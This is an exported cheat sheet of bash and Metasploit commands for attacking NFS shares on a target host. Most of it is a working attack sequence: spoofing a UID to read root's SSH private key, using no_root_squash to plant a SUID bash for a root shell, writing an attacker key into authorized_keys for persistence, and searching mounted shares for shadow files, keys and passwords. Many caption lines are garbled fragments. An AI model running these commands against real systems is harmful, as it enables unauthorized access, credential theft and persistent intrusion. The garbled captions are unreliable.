---
id: "3ax6bs57nmpsiuwrn"
title: "nfs"
description: ""
tags: []
order: "5"
createdAt: "2026-05-30T15:44:56.675Z"
updatedAt: "2026-05-30T15:45:08.094Z"
---

## Port Discovery & Scanning
<!-- section: {"id":"6nuw4k6p1mpsiv5b1","order":0,"collapsed":false} -->

### y068uer4pmpsiv5cl
```bash
nmap -sV -sC -p 111,2049 $TARGET
```

_Port Discovery & Scanning_

**Tags:** nfs, nmap, rustscan, rpcinfo, recon, discovery
<!-- cmd: {"id":"y068uer4pmpsiv5cl","language":"bash","sectionId":"6nuw4k6p1mpsiv5b1","tags":["nfs","nmap","rustscan","rpcinfo","recon","discovery"]} -->

### zbyhzr0bzmpsiv5cp
```bash
nmap -p 111,2049 --script nfs-ls,nfs-showmount,nfs-statfs,rpcinfo $TARGET
```

**Tags:** nfs, nmap, rustscan, rpcinfo, recon, discovery
<!-- cmd: {"id":"zbyhzr0bzmpsiv5cp","language":"bash","sectionId":"6nuw4k6p1mpsiv5b1","tags":["nfs","nmap","rustscan","rpcinfo","recon","discovery"]} -->

### xpxzu65jimpsiv5ct
```bash
rustscan -a $TARGET -p 111,2049 -- -sV --script nfs-showmount
```

**Tags:** nfs, nmap, rustscan, rpcinfo, recon, discovery
<!-- cmd: {"id":"xpxzu65jimpsiv5ct","language":"bash","sectionId":"6nuw4k6p1mpsiv5b1","tags":["nfs","nmap","rustscan","rpcinfo","recon","discovery"]} -->

### box6hg2lkmpsiv5cw
```bash
rpcinfo -p $TARGET
```

**Tags:** nfs, nmap, rustscan, rpcinfo, recon, discovery
<!-- cmd: {"id":"box6hg2lkmpsiv5cw","language":"bash","sectionId":"6nuw4k6p1mpsiv5b1","tags":["nfs","nmap","rustscan","rpcinfo","recon","discovery"]} -->

## Show Exported Shares
<!-- section: {"id":"haavn0yvxmpsiv5b6","order":1,"collapsed":false} -->

### qh31r0t3ampsiv5d9
```bash
showmount -e $TARGET
```

_Show Exported Shares_

**Tags:** nfs, showmount, enumeration, unauthenticated
<!-- cmd: {"id":"qh31r0t3ampsiv5d9","language":"bash","sectionId":"haavn0yvxmpsiv5b6","tags":["nfs","showmount","enumeration","unauthenticated"]} -->

### cjwe1cmlimpsiv5dc
```bash
showmount -a $TARGET
```

**Tags:** nfs, showmount, enumeration, unauthenticated
<!-- cmd: {"id":"cjwe1cmlimpsiv5dc","language":"bash","sectionId":"haavn0yvxmpsiv5b6","tags":["nfs","showmount","enumeration","unauthenticated"]} -->

### m9pguemmympsiv5dg
```bash
showmount -d $TARGET
```

**Tags:** nfs, showmount, enumeration, unauthenticated
<!-- cmd: {"id":"m9pguemmympsiv5dg","language":"bash","sectionId":"haavn0yvxmpsiv5b6","tags":["nfs","showmount","enumeration","unauthenticated"]} -->

### uelis92mhmpsiv5dk
```bash
nmap --script nfs-showmount -p 111,2049 $TARGET
```

**Tags:** nfs, showmount, enumeration, unauthenticated
<!-- cmd: {"id":"uelis92mhmpsiv5dk","language":"bash","sectionId":"haavn0yvxmpsiv5b6","tags":["nfs","showmount","enumeration","unauthenticated"]} -->

### c3x1rlodcmpsiv5do
```bash
rpcinfo -p $TARGET | grep nfs
```

**Tags:** nfs, showmount, enumeration, unauthenticated
<!-- cmd: {"id":"c3x1rlodcmpsiv5do","language":"bash","sectionId":"haavn0yvxmpsiv5b6","tags":["nfs","showmount","enumeration","unauthenticated"]} -->

## Mount NFS Share
<!-- section: {"id":"p8xn5tbxmmpsiv5ba","order":2,"collapsed":false} -->

### p47my4q6kmpsiv5e0
```bash
mkdir /mnt/nfs_share
```

_Mount NFS Share_

**Tags:** nfs, mount, access, unauthenticated
<!-- cmd: {"id":"p47my4q6kmpsiv5e0","language":"bash","sectionId":"p8xn5tbxmmpsiv5ba","tags":["nfs","mount","access","unauthenticated"]} -->

### 94mvsyzermpsiv5e4
```bash
mount -t nfs $TARGET:/share /mnt/nfs_share
```

**Tags:** nfs, mount, access, unauthenticated
<!-- cmd: {"id":"94mvsyzermpsiv5e4","language":"bash","sectionId":"p8xn5tbxmmpsiv5ba","tags":["nfs","mount","access","unauthenticated"]} -->

### w5wrg09hcmpsiv5e8
```bash
mount -t nfs -o vers=3 $TARGET:/share /mnt/nfs_share
```

**Tags:** nfs, mount, access, unauthenticated
<!-- cmd: {"id":"w5wrg09hcmpsiv5e8","language":"bash","sectionId":"p8xn5tbxmmpsiv5ba","tags":["nfs","mount","access","unauthenticated"]} -->

### h1driz7h9mpsiv5ec
```bash
mount -t nfs -o nolock $TARGET:/share /mnt/nfs_share
```

**Tags:** nfs, mount, access, unauthenticated
<!-- cmd: {"id":"h1driz7h9mpsiv5ec","language":"bash","sectionId":"p8xn5tbxmmpsiv5ba","tags":["nfs","mount","access","unauthenticated"]} -->

### 20qq2pgbampsiv5eg
```bash
ls -laR /mnt/nfs_share
```

**Tags:** nfs, mount, access, unauthenticated
<!-- cmd: {"id":"20qq2pgbampsiv5eg","language":"bash","sectionId":"p8xn5tbxmmpsiv5ba","tags":["nfs","mount","access","unauthenticated"]} -->

### yxv12jmdvmpsiv5ek
```bash
mount -t nfs4 $TARGET:/share /mnt/nfs_share
```

**Tags:** nfs, mount, access, unauthenticated
<!-- cmd: {"id":"yxv12jmdvmpsiv5ek","language":"bash","sectionId":"p8xn5tbxmmpsiv5ba","tags":["nfs","mount","access","unauthenticated"]} -->

## UID Spoofing for Access Bypass
<!-- section: {"id":"8ie0g0gl7mpsiv5bd","order":3,"collapsed":false} -->

### 8kcnzcoyxmpsiv5ex
```bash
ls -la /mnt/nfs_share
```

_UID Spoofing for Access Bypass NFS uses UID/GID for authorization — spoof UID to access protected files._

**Tags:** nfs, uid-spoofing, privilege-escalation, misconfiguration
<!-- cmd: {"id":"8kcnzcoyxmpsiv5ex","language":"bash","sectionId":"8ie0g0gl7mpsiv5bd","tags":["nfs","uid-spoofing","privilege-escalation","misconfiguration"]} -->

### offmnr1bxmpsiv5f0
```bash
useradd -u 1001 fakeusr
```

**Tags:** nfs, uid-spoofing, privilege-escalation, misconfiguration
<!-- cmd: {"id":"offmnr1bxmpsiv5f0","language":"bash","sectionId":"8ie0g0gl7mpsiv5bd","tags":["nfs","uid-spoofing","privilege-escalation","misconfiguration"]} -->

### 5cptxiwmbmpsiv5f3
```bash
su fakeusr
```

**Tags:** nfs, uid-spoofing, privilege-escalation, misconfiguration
<!-- cmd: {"id":"5cptxiwmbmpsiv5f3","language":"bash","sectionId":"8ie0g0gl7mpsiv5bd","tags":["nfs","uid-spoofing","privilege-escalation","misconfiguration"]} -->

### t31i7kbmumpsiv5f8
```bash
cat /mnt/nfs_share/root/.ssh/id_rsa
```

_share/root/.ssh/id_

**Tags:** nfs, uid-spoofing, privilege-escalation, misconfiguration
<!-- cmd: {"id":"t31i7kbmumpsiv5f8","language":"bash","sectionId":"8ie0g0gl7mpsiv5bd","tags":["nfs","uid-spoofing","privilege-escalation","misconfiguration"]} -->

### 00h7nazrnmpsiv5fb
```bash
sudo -u '#1001' cat /mnt/nfs_share/home/$USER/file
```

**Tags:** nfs, uid-spoofing, privilege-escalation, misconfiguration
<!-- cmd: {"id":"00h7nazrnmpsiv5fb","language":"bash","sectionId":"8ie0g0gl7mpsiv5bd","tags":["nfs","uid-spoofing","privilege-escalation","misconfiguration"]} -->

## no_root_squash Exploitation
<!-- section: {"id":"9o65s7hjxmpsiv5bh","order":4,"collapsed":false} -->

### ljp871tdwmpsiv5fj
```bash
showmount -e $TARGET
```

_no_

**Tags:** nfs, no_root_squash, privilege-escalation, suid, misconfiguration, high-impact
<!-- cmd: {"id":"ljp871tdwmpsiv5fj","language":"bash","sectionId":"9o65s7hjxmpsiv5bh","tags":["nfs","no_root_squash","privilege-escalation","suid","misconfiguration","high-impact"]} -->

### uqyyv8kx8mpsiv5fm
```bash
cat /etc/exports
```

_root_

**Tags:** nfs, no_root_squash, privilege-escalation, suid, misconfiguration, high-impact
<!-- cmd: {"id":"uqyyv8kx8mpsiv5fm","language":"bash","sectionId":"9o65s7hjxmpsiv5bh","tags":["nfs","no_root_squash","privilege-escalation","suid","misconfiguration","high-impact"]} -->

### rj0nefc13mpsiv5fr
```bash
mount -t nfs $TARGET:/share /mnt/nfs_share
```

_root_

**Tags:** nfs, no_root_squash, privilege-escalation, suid, misconfiguration, high-impact
<!-- cmd: {"id":"rj0nefc13mpsiv5fr","language":"bash","sectionId":"9o65s7hjxmpsiv5bh","tags":["nfs","no_root_squash","privilege-escalation","suid","misconfiguration","high-impact"]} -->

### t5wfyai1umpsiv5fv
```bash
cp /bin/bash /mnt/nfs_share/bash
```

_root_

**Tags:** nfs, no_root_squash, privilege-escalation, suid, misconfiguration, high-impact
<!-- cmd: {"id":"t5wfyai1umpsiv5fv","language":"bash","sectionId":"9o65s7hjxmpsiv5bh","tags":["nfs","no_root_squash","privilege-escalation","suid","misconfiguration","high-impact"]} -->

### 106g482mjmpsiv5fy
```bash
chmod +s /mnt/nfs_share/bash
```

_root_

**Tags:** nfs, no_root_squash, privilege-escalation, suid, misconfiguration, high-impact
<!-- cmd: {"id":"106g482mjmpsiv5fy","language":"bash","sectionId":"9o65s7hjxmpsiv5bh","tags":["nfs","no_root_squash","privilege-escalation","suid","misconfiguration","high-impact"]} -->

### q8g3og4bdmpsiv5g3
```bash
/tmp/bash -p
```

_root_

**Tags:** nfs, no_root_squash, privilege-escalation, suid, misconfiguration, high-impact
<!-- cmd: {"id":"q8g3og4bdmpsiv5g3","language":"bash","sectionId":"9o65s7hjxmpsiv5bh","tags":["nfs","no_root_squash","privilege-escalation","suid","misconfiguration","high-impact"]} -->

### 29uc92m4empsiv5g6
```bash
/mnt/nfs_share/bash -p
```

_root_

**Tags:** nfs, no_root_squash, privilege-escalation, suid, misconfiguration, high-impact
<!-- cmd: {"id":"29uc92m4empsiv5g6","language":"bash","sectionId":"9o65s7hjxmpsiv5bh","tags":["nfs","no_root_squash","privilege-escalation","suid","misconfiguration","high-impact"]} -->

## Write SSH Key via NFS
<!-- section: {"id":"3bwhqp6z1mpsiv5bl","order":5,"collapsed":false} -->

### jzx6npzstmpsiv5gk
```bash
mount -t nfs $TARGET:/home/$USER /mnt/nfs_share
```

_Write SSH Key via NFS_

**Tags:** nfs, ssh-key, persistence, privilege-escalation
<!-- cmd: {"id":"jzx6npzstmpsiv5gk","language":"bash","sectionId":"3bwhqp6z1mpsiv5bl","tags":["nfs","ssh-key","persistence","privilege-escalation"]} -->

### j1lrz38j5mpsiv5gq
```bash
mkdir -p /mnt/nfs_share/.ssh
```

**Tags:** nfs, ssh-key, persistence, privilege-escalation
<!-- cmd: {"id":"j1lrz38j5mpsiv5gq","language":"bash","sectionId":"3bwhqp6z1mpsiv5bl","tags":["nfs","ssh-key","persistence","privilege-escalation"]} -->

### nbrm934xwmpsiv5gu
```bash
echo "$(cat ~/.ssh/id_rsa.pub)" >> /mnt/nfs_share/.ssh/authorized_keys
```

_rsa.pub)" >> /mnt/nfs_

**Tags:** nfs, ssh-key, persistence, privilege-escalation
<!-- cmd: {"id":"nbrm934xwmpsiv5gu","language":"bash","sectionId":"3bwhqp6z1mpsiv5bl","tags":["nfs","ssh-key","persistence","privilege-escalation"]} -->

### 2q616nxlfmpsiv5gx
```bash
chmod 600 /mnt/nfs_share/.ssh/authorized_keys
```

_share/.ssh/authorized_

**Tags:** nfs, ssh-key, persistence, privilege-escalation
<!-- cmd: {"id":"2q616nxlfmpsiv5gx","language":"bash","sectionId":"3bwhqp6z1mpsiv5bl","tags":["nfs","ssh-key","persistence","privilege-escalation"]} -->

### n4lthdi5cmpsiv5h1
```bash
ssh -i ~/.ssh/id_rsa $USER@$TARGET
```

**Tags:** nfs, ssh-key, persistence, privilege-escalation
<!-- cmd: {"id":"n4lthdi5cmpsiv5h1","language":"bash","sectionId":"3bwhqp6z1mpsiv5bl","tags":["nfs","ssh-key","persistence","privilege-escalation"]} -->

## NFS Sensitive File Hunt
<!-- section: {"id":"jzgq0j8p1mpsiv5bo","order":6,"collapsed":false} -->

### 5aucrsf5jmpsiv5hg
```bash
find /mnt/nfs_share -name "*.conf" -o -name "*.cfg" -o -name "*.ini" 2>/dev/null
```

_NFS Sensitive File Hunt_

**Tags:** nfs, loot, sensitive-files, credentials, post-exploitation
<!-- cmd: {"id":"5aucrsf5jmpsiv5hg","language":"bash","sectionId":"jzgq0j8p1mpsiv5bo","tags":["nfs","loot","sensitive-files","credentials","post-exploitation"]} -->

### t8yjrixr2mpsiv5hj
```bash
find /mnt/nfs_share -name "*.key" -o -name "*.pem" -o -name "id_rsa" 2>/dev/null
```

_share -name "*.key" -o -name "*.pem" -o -name "id_

**Tags:** nfs, loot, sensitive-files, credentials, post-exploitation
<!-- cmd: {"id":"t8yjrixr2mpsiv5hj","language":"bash","sectionId":"jzgq0j8p1mpsiv5bo","tags":["nfs","loot","sensitive-files","credentials","post-exploitation"]} -->

### hviq0y1kimpsiv5hn
```bash
find /mnt/nfs_share -name "*.bak" -o -name "*.backup" 2>/dev/null
```

**Tags:** nfs, loot, sensitive-files, credentials, post-exploitation
<!-- cmd: {"id":"hviq0y1kimpsiv5hn","language":"bash","sectionId":"jzgq0j8p1mpsiv5bo","tags":["nfs","loot","sensitive-files","credentials","post-exploitation"]} -->

### ki2z05aafmpsiv5hr
```bash
find /mnt/nfs_share -name "*.sql" 2>/dev/null
```

**Tags:** nfs, loot, sensitive-files, credentials, post-exploitation
<!-- cmd: {"id":"ki2z05aafmpsiv5hr","language":"bash","sectionId":"jzgq0j8p1mpsiv5bo","tags":["nfs","loot","sensitive-files","credentials","post-exploitation"]} -->

### ycseixtjnmpsiv5hv
```bash
find /mnt/nfs_share -name "shadow" -o -name "passwd" 2>/dev/null
```

**Tags:** nfs, loot, sensitive-files, credentials, post-exploitation
<!-- cmd: {"id":"ycseixtjnmpsiv5hv","language":"bash","sectionId":"jzgq0j8p1mpsiv5bo","tags":["nfs","loot","sensitive-files","credentials","post-exploitation"]} -->

### rl61h1f89mpsiv5hy
```bash
grep -r "password" /mnt/nfs_share/ 2>/dev/null
```

**Tags:** nfs, loot, sensitive-files, credentials, post-exploitation
<!-- cmd: {"id":"rl61h1f89mpsiv5hy","language":"bash","sectionId":"jzgq0j8p1mpsiv5bo","tags":["nfs","loot","sensitive-files","credentials","post-exploitation"]} -->

### xeasfad67mpsiv5i3
```bash
grep -r "secret" /mnt/nfs_share/ 2>/dev/null
```

**Tags:** nfs, loot, sensitive-files, credentials, post-exploitation
<!-- cmd: {"id":"xeasfad67mpsiv5i3","language":"bash","sectionId":"jzgq0j8p1mpsiv5bo","tags":["nfs","loot","sensitive-files","credentials","post-exploitation"]} -->

## NFSv4 ACL Enumeration
<!-- section: {"id":"2dkfwcz71mpsiv5bs","order":7,"collapsed":false} -->

### rojz65ifhmpsiv5ih
```bash
nfs4_getfacl /mnt/nfs_share/
```

_getfacl /mnt/nfs_

**Tags:** nfs, nfsv4, acl, enumeration
<!-- cmd: {"id":"rojz65ifhmpsiv5ih","language":"bash","sectionId":"2dkfwcz71mpsiv5bs","tags":["nfs","nfsv4","acl","enumeration"]} -->

### jhtertu0vmpsiv5ik
```bash
nfs4_getfacl /mnt/nfs_share/sensitive_file
```

_getfacl /mnt/nfs_

**Tags:** nfs, nfsv4, acl, enumeration
<!-- cmd: {"id":"jhtertu0vmpsiv5ik","language":"bash","sectionId":"2dkfwcz71mpsiv5bs","tags":["nfs","nfsv4","acl","enumeration"]} -->

## NSE Scripts — Comprehensive Scan
<!-- section: {"id":"9o9m38hy7mpsiv5bw","order":8,"collapsed":false} -->

### dhye93hm4mpsiv5iv
```bash
nmap -p 111,2049 --script "nfs-*,rpcinfo" $TARGET
```

_NSE Scripts — Comprehensive Scan_

**Tags:** nfs, nmap, nse, vulnerability-scan
<!-- cmd: {"id":"dhye93hm4mpsiv5iv","language":"bash","sectionId":"9o9m38hy7mpsiv5bw","tags":["nfs","nmap","nse","vulnerability-scan"]} -->

### bbzuq8cx3mpsiv5j0
```bash
nmap -p 2049 --script nfs-ls,nfs-showmount,nfs-statfs $TARGET
```

**Tags:** nfs, nmap, nse, vulnerability-scan
<!-- cmd: {"id":"bbzuq8cx3mpsiv5j0","language":"bash","sectionId":"9o9m38hy7mpsiv5bw","tags":["nfs","nmap","nse","vulnerability-scan"]} -->

## NFS Enumeration via Metasploit
<!-- section: {"id":"rrexzxk2rmpsiv5bz","order":9,"collapsed":false} -->

### h74n51s7impsiv5j8
```bash
use auxiliary/scanner/nfs/nfsmount
```

_NFS Enumeration via Metasploit_

**Tags:** nfs, metasploit, enumeration, unauthenticated
<!-- cmd: {"id":"h74n51s7impsiv5j8","language":"bash","sectionId":"rrexzxk2rmpsiv5bz","tags":["nfs","metasploit","enumeration","unauthenticated"]} -->

### etp508i2smpsiv5jc
```bash
set RHOSTS $TARGET
```

**Tags:** nfs, metasploit, enumeration, unauthenticated
<!-- cmd: {"id":"etp508i2smpsiv5jc","language":"bash","sectionId":"rrexzxk2rmpsiv5bz","tags":["nfs","metasploit","enumeration","unauthenticated"]} -->

### od2rt2pasmpsiv5jg
```bash
run
```

**Tags:** nfs, metasploit, enumeration, unauthenticated
<!-- cmd: {"id":"od2rt2pasmpsiv5jg","language":"bash","sectionId":"rrexzxk2rmpsiv5bz","tags":["nfs","metasploit","enumeration","unauthenticated"]} -->

## Common Misconfigurations
<!-- section: {"id":"2ytio6pqtmpsiv5c3","order":10,"collapsed":false} -->

### 6no0m6mvmmpsiv5jp
```bash
grep no_root_squash /etc/exports
```

_root_

**Tags:** nfs, misconfiguration, no_root_squash, wildcard, anonymous
<!-- cmd: {"id":"6no0m6mvmmpsiv5jp","language":"bash","sectionId":"2ytio6pqtmpsiv5c3","tags":["nfs","misconfiguration","no_root_squash","wildcard","anonymous"]} -->

### u9ehj1qlsmpsiv5jt
```bash
cat /etc/exports
```

_root_

**Tags:** nfs, misconfiguration, no_root_squash, wildcard, anonymous
<!-- cmd: {"id":"u9ehj1qlsmpsiv5jt","language":"bash","sectionId":"2ytio6pqtmpsiv5c3","tags":["nfs","misconfiguration","no_root_squash","wildcard","anonymous"]} -->

### cgm4zk0cbmpsiv5jx
```bash
showmount -e $TARGET
```

_root_

**Tags:** nfs, misconfiguration, no_root_squash, wildcard, anonymous
<!-- cmd: {"id":"cgm4zk0cbmpsiv5jx","language":"bash","sectionId":"2ytio6pqtmpsiv5c3","tags":["nfs","misconfiguration","no_root_squash","wildcard","anonymous"]} -->

### 3jpnc4065mpsiv5k0
```bash
ls -la /mnt/nfs_share/
```

_root_

**Tags:** nfs, misconfiguration, no_root_squash, wildcard, anonymous
<!-- cmd: {"id":"3jpnc4065mpsiv5k0","language":"bash","sectionId":"2ytio6pqtmpsiv5c3","tags":["nfs","misconfiguration","no_root_squash","wildcard","anonymous"]} -->

### pe733b8y8mpsiv5k4
```bash
mount -t nfs $TARGET:/share /mnt/nfs_share -o anon
```

_root_

**Tags:** nfs, misconfiguration, no_root_squash, wildcard, anonymous
<!-- cmd: {"id":"pe733b8y8mpsiv5k4","language":"bash","sectionId":"2ytio6pqtmpsiv5c3","tags":["nfs","misconfiguration","no_root_squash","wildcard","anonymous"]} -->

## Unmount and Cleanup
<!-- section: {"id":"xjyzj7fqmmpsiv5c6","order":11,"collapsed":false} -->

### y2kuem55pmpsiv5km
```bash
umount /mnt/nfs_share
```

_Unmount and Cleanup_

**Tags:** nfs, cleanup, operational-security
<!-- cmd: {"id":"y2kuem55pmpsiv5km","language":"bash","sectionId":"xjyzj7fqmmpsiv5c6","tags":["nfs","cleanup","operational-security"]} -->

### 8jkejatfimpsiv5kp
```bash
umount -f /mnt/nfs_share
```

**Tags:** nfs, cleanup, operational-security
<!-- cmd: {"id":"8jkejatfimpsiv5kp","language":"bash","sectionId":"xjyzj7fqmmpsiv5c6","tags":["nfs","cleanup","operational-security"]} -->

### oxd2vihp4mpsiv5ku
```bash
umount -l /mnt/nfs_share
```

**Tags:** nfs, cleanup, operational-security
<!-- cmd: {"id":"oxd2vihp4mpsiv5ku","language":"bash","sectionId":"xjyzj7fqmmpsiv5c6","tags":["nfs","cleanup","operational-security"]} -->
